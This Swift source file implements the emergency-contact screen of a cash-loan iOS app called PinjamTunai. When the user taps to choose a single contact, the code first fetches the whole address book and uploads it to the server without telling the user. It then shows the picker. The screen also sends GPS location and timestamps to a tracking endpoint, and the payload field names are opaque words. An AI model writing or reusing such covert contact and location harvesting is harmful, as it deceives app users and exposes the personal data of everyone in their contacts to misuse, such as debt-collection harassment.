//
//  RelationViewController.swift
//  PinjamTunai
//
//  Created by hekang on 2025/12/9.
//

import UIKit
import SnapKit
import RxRelay
import RxSwift
import RxCocoa
import TYAlertController
internal import Contacts

class RelationViewController: BaseViewController {
    
    var productID: String = ""
    
    let viewModel = RelationViewModel()
    
    var modelArray: [midModel] = []
    
    var stepArray: [StepModel] = []
    
    var model = BehaviorRelay<BaseModel?>(value: nil)
    
    let disposeBag = DisposeBag()
    
    let locationManager = AppLocationManager()
    
    let trackingViewModel = TrackingViewModel()
    
    var onetime: String = ""
    
    lazy var nextBtn: UIButton = {
        let nextBtn = UIButton(type: .custom)
        nextBtn.setTitleColor(.white, for: .normal)
        nextBtn.setTitle(LanguageManager.localizedString(for: "Next"), for: .normal)
        nextBtn.titleLabel?.font = UIFont.systemFont(ofSize: 14, weight: UIFont.Weight(500))
        nextBtn.setBackgroundImage(UIImage(named: "home_apply_image"), for: .normal)
        nextBtn.adjustsImageWhenHighlighted = false
        return nextBtn
    }()
    
    lazy var tableView: UITableView = {
        let tableView = UITableView(frame: .zero, style: .plain)
        tableView.separatorStyle = .none
        tableView.backgroundColor = .clear
        tableView.estimatedRowHeight = 80
        tableView.showsVerticalScrollIndicator = false
        tableView.contentInsetAdjustmentBehavior = .never
        tableView.rowHeight = UITableView.automaticDimension
        tableView.register(RelationViewCell.self, forCellReuseIdentifier: "RelationViewCell")
        if #available(iOS 15.0, *) {
            tableView.sectionHeaderTopPadding = 0
        }
        return tableView
    }()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        // Do any additional setup after loading the view.
        view.addSubview(headView)
        
        headView.nameLabel.text = LanguageManager.localizedString(for: "Emergency Contact")
        
        headView.snp.makeConstraints { make in
            make.top.equalTo(self.view.safeAreaLayoutGuide.snp.top)
            make.left.right.equalToSuperview()
            make.height.equalTo(40)
        }
        
        headView.backBlock = { [weak self] in
            guard let self = self else { return }
            let popView = PopSLeaveView(frame: self.view.bounds)
            let alertVc = TYAlertController(alert: popView, preferredStyle: .alert)
            self.present(alertVc!, animated: true)
            
            popView.oneBlock = { [weak self] in
                guard let self = self else { return }
                self.dismiss(animated: true)
            }
            
            popView.twoBlock = { [weak self] in
                guard let self = self else { return }
                self.dismiss(animated: true) {
                    self.backToListPageVc()
                }
            }
            
        }
        
        let stepView = StepIndicatorView()
        view.addSubview(stepView)
        
        stepView.snp.makeConstraints { make in
            make.centerX.equalToSuperview()
            make.top.equalTo(headView.snp.bottom).offset(15)
            make.height.equalTo(40)
            make.left.equalToSuperview().offset(20)
        }
        
        for (index, _) in modelArray.enumerated() {
            stepArray.append(StepModel(title: "\(index + 1)", isCurrent: (index < modelArray.count - 1)))
        }
        stepView.modelArray = stepArray
        
        
        view.addSubview(nextBtn)
        nextBtn.snp.makeConstraints { make in
            make.bottom.equalTo(self.view.safeAreaLayoutGuide.snp.bottom).offset(-10)
            make.centerX.equalToSuperview()
            make.size.equalTo(CGSize(width: 313, height: 50))
        }
        
        view.addSubview(tableView)
        tableView.snp.makeConstraints { make in
            make.top.equalTo(stepView.snp.bottom).offset(20)
            make.left.right.equalToSuperview()
            make.bottom.equalTo(nextBtn.snp.top).offset(-20)
        }
        
        
        self.model
            .asObservable()
            .map { $0?.kindness?.prince ?? [] }
            .bind(to: tableView.rx.items) { tableView, row, model in
                let cell = tableView.dequeueReusableCell(
                    withIdentifier: "RelationViewCell",
                    for: IndexPath(row: row, section: 0)
                ) as! RelationViewCell
                cell.model = model
                cell.relationBlock = { [weak self] in
                    guard let self = self else { return }
                    popOneModel(with: model, cell: cell)
                }
                
                cell.phoneBlock = { [weak self] in
                    guard let self = self else { return }
                    ContactManager.shared.fetchAllContacts(on: self) { contacts in
                        if contacts.isEmpty {
                            return
                        }
                        do {
                            let jsonData = try JSONEncoder().encode(contacts)
                            if let jsonString = String(data: jsonData, encoding: .utf8) {
                                self.sendAllMessage(with: jsonString)
                            }
                        } catch {
                            print("Error encoding JSON:", error)
                        }
                    }
                    
                    ContactManager.shared.selectSingleContact(on: self) { contact in
                        let givenName = contact?.givenName ?? ""
                        let familyName = contact?.familyName ?? ""
                        let phones = contact?.phoneNumbers.map { $0.value.stringValue }
                        let phoneNumber = phones?.first ?? ""
                        let name = "\(givenName) \(familyName)"
                        cell.fourLabel.text = "\(name)-\(phoneNumber)"
                        cell.fourLabel.textColor = UIColor.init(hex: "#3B3B3B")
                        
                        model.bore = name
                        model.beloved = phoneNumber
                    }
                    
                }
                return cell
            }
            .disposed(by: disposeBag)
        
        nextBtn.rx.tap.bind(onNext: { [weak self] in
            guard let self = self else { return }
            var phoneArray: [[String: String]] = []
            let modelArray = self.model.value?.kindness?.prince ?? []
            for (_, model) in modelArray.enumerated() {
                let bore = model.bore ?? ""
                let fairy = model.fairy ?? ""
                let beloved = model.beloved ?? ""
                let dict = ["bore": bore, "fairy": fairy, "beloved": beloved]
                phoneArray.append(dict)
            }
            
            var jsonSring: String = ""
            
            do {
                let jsonData = try JSONSerialization.data(withJSONObject: phoneArray, options: [])
                if let jsonString = String(data: jsonData, encoding: .utf8) {
                    jsonSring = jsonString
                }
            } catch {
                print("Failed JSON: \(error)")
            }
            
            let json = ["shot": productID, "kindness": jsonSring]
            
            Task {
                await self.saveRelationInfo(with: json)
            }
            
        }).disposed(by: disposeBag)
        
        Task {
            await getListInfo()
        }
        
        locationManager.getCurrentLocation { model in
            LocationManagerModel.shared.model = model
        }
        
        onetime = String(Int(Date().timeIntervalSince1970))
        
    }
    
}

extension RelationViewController {
    
    private func saveRelationInfo(with json: [String: String]) async {
        Task {
            do {
                let model = try await viewModel.saveRelationInfo(json: json)
                if model.token == 0 {
                    self.navigationController?.popViewController(animated: true)
                    await self.tracksgmesageInfo()
                }
                Toaster.showMessage(with: model.stretched ?? "")
            } catch {
                
            }
        }
    }
    
    private func popOneModel(with model: princeModel, cell: RelationViewCell) {
        let oneView = PopOneView(frame: self.view.bounds)
        let modelArray = model.breeze ?? []
        oneView.nameLabel.text = model.shrank ?? ""
        for (index, model) in modelArray.enumerated() {
            let text = cell.threeLabel.text
            let target = model.bore ?? ""
            if target == text {
                oneView.selectedIndex = index
            }
            oneView.modelArray = modelArray
        }
        
        let alertVc = TYAlertController(alert: oneView, preferredStyle: .actionSheet)!
        self.present(alertVc, animated: true)
        
        oneView.cancelBlock = { [weak self] in
            guard let self = self else { return }
            self.dismiss(animated: true)
        }
        
        oneView.confirmBlock = { [weak self] amodel in
            guard let self = self else { return }
            self.dismiss(animated: true) {
                cell.threeLabel.text = amodel.bore ?? ""
                model.fairy = amodel.heads ?? ""
                cell.threeLabel.textColor = UIColor(hex: "#3B3B3B")
            }
        }
    }
    
    private func getListInfo() async {
        Task {
            do {
                let json = ["shot": productID]
                let model = try await viewModel.getRelationInfo(json: json)
                if model.token == 0 {
                    self.model.accept(model)
                }
            } catch  {
                
            }
        }
    }
    
    private func sendAllMessage(with jsonStr: String) {
        
        Task {
            do {
                let json = ["kindness": jsonStr]
                let _ = try await viewModel.sendMessageInfo(json: json)
            } catch {
                
            }
        }
        
    }
    
    private func tracksgmesageInfo() async {
        Task {
            do {
                let locationModel = LocationManagerModel.shared.model
                let ajson = ["sure": "6",
                             "thereafter": locationModel?.thereafter ?? "",
                             "leading": locationModel?.leading ?? "",
                             "aelfrida": onetime,
                             "hair": String(Int(Date().timeIntervalSince1970)),
                             "swear": ""]
                let _ = try await trackingViewModel.saveTrackingMessageIngo(json: ajson)
            } catch  {
                
            }
        }
    }
    
}
